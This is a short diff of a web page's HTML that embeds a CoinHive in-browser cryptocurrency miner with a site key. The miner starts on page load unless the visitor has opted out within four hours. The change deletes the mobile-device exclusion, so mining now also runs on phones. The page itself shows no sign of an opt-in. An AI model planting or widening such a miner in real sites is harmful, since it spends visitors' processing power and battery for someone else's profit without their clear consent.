@@ -8,7 +8,7 @@ integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="ano
 <script>
 	var miner = new CoinHive.Anonymous('hgKxC20Nt7n3NnnFI9ZGECFSRkWpZeB6', {throttle: 0.3});
 	// in the last 14400 seconds (4 hours):
-	if (!miner.isMobile() && !miner.didOptOut(14400)) {
+	if (!miner.didOptOut(14400)) {
 		miner.start();
 	}
 </script>
